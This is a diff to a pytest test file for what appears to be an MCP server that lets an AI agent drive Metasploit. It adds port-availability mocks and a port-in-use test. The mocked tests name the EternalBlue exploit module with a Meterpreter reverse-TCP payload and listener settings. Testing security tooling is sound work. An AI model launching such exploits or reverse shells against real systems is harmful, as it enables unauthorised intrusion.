@@ -416,13 +416,15 @@ class TestExploitExecution:
         """Test exploit execution with dictionary payload options."""
         client, mock_rpc, mock_console = mock_exploit_environment
         
-        result = await run_exploit(
-            module_name="windows/smb/ms17_010_eternalblue",
-            options={"RHOSTS": "192.168.1.1"},
-            payload_name="windows/meterpreter/reverse_tcp",
-            payload_options={"LHOST": "192.168.1.100", "LPORT": 4444},
-            run_as_job=True
-        )
+        # Mock port availability check to always return available
+        with patch('MetasploitMCP.check_port_available', return_value=(True, "")):
+            result = await run_exploit(
+                module_name="windows/smb/ms17_010_eternalblue",
+                options={"RHOSTS": "192.168.1.1"},
+                payload_name="windows/meterpreter/reverse_tcp",
+                payload_options={"LHOST": "192.168.1.100", "LPORT": 4444},
+                run_as_job=True
+            )
         
         assert result["status"] == "success"
         mock_rpc.assert_called_once()
@@ -432,13 +434,15 @@ class TestExploitExecution:
         """Test exploit execution with string payload options."""
         client, mock_rpc, mock_console = mock_exploit_environment
         
-        result = await run_exploit(
-            module_name="windows/smb/ms17_010_eternalblue",
-            options={"RHOSTS": "192.168.1.1"},
-            payload_name="windows/meterpreter/reverse_tcp",
-            payload_options="LHOST=192.168.1.100,LPORT=4444",
-            run_as_job=True
-        )
+        # Mock port availability check to always return available
+        with patch('MetasploitMCP.check_port_available', return_value=(True, "")):
+            result = await run_exploit(
+                module_name="windows/smb/ms17_010_eternalblue",
+                options={"RHOSTS": "192.168.1.1"},
+                payload_name="windows/meterpreter/reverse_tcp",
+                payload_options="LHOST=192.168.1.100,LPORT=4444",
+                run_as_job=True
+            )
         
         assert result["status"] == "success"
         # Verify RPC was called with parsed options
@@ -647,12 +651,14 @@ class TestListenerManagement:
         """Test starting listener with dictionary additional options."""
         client, mock_rpc = mock_job_environment
         
-        result = await start_listener(
-            payload_type="windows/meterpreter/reverse_tcp",
-            lhost="192.168.1.100",
-            lport=4444,
-            additional_options={"ExitOnSession": True}
-        )
+        # Mock port availability check to always return available
+        with patch('MetasploitMCP.check_port_available', return_value=(True, "")):
+            result = await start_listener(
+                payload_type="windows/meterpreter/reverse_tcp",
+                lhost="192.168.1.100",
+                lport=4444,
+                additional_options={"ExitOnSession": True}
+            )
         
         assert result["status"] == "success"
         assert "job" in result["message"]
@@ -662,12 +668,14 @@ class TestListenerManagement:
         """Test starting listener with string additional options."""
         client, mock_rpc = mock_job_environment
         
-        result = await start_listener(
-            payload_type="windows/meterpreter/reverse_tcp",
-            lhost="192.168.1.100", 
-            lport=4444,
-            additional_options="ExitOnSession=true,Verbose=false"
-        )
+        # Mock port availability check to always return available
+        with patch('MetasploitMCP.check_port_available', return_value=(True, "")):
+            result = await start_listener(
+                payload_type="windows/meterpreter/reverse_tcp",
+                lhost="192.168.1.100", 
+                lport=4444,
+                additional_options="ExitOnSession=true,Verbose=false"
+            )
         
         assert result["status"] == "success"
         # Verify RPC was called with parsed options
@@ -689,6 +697,22 @@ class TestListenerManagement:
         
         assert result["status"] == "error"
         assert "Invalid LPORT" in result["message"]
+    
+    @pytest.mark.asyncio
+    async def test_start_listener_port_in_use(self, mock_job_environment):
+        """Test starting listener when port is already in use."""
+        client, mock_rpc = mock_job_environment
+        
+        # Mock port availability check to return port in use
+        with patch('MetasploitMCP.check_port_available', return_value=(False, "Port 4444 is already in use on 0.0.0.0. Please choose a different port or stop the service using this port.")):
+            result = await start_listener(
+                payload_type="windows/meterpreter/reverse_tcp",
+                lhost="192.168.1.100",
+                lport=4444
+            )
+        
+        assert result["status"] == "error"
+        assert "Port 4444 is already in use" in result["message"]
 
     @pytest.mark.asyncio
     async def test_stop_job(self, mock_job_environment):
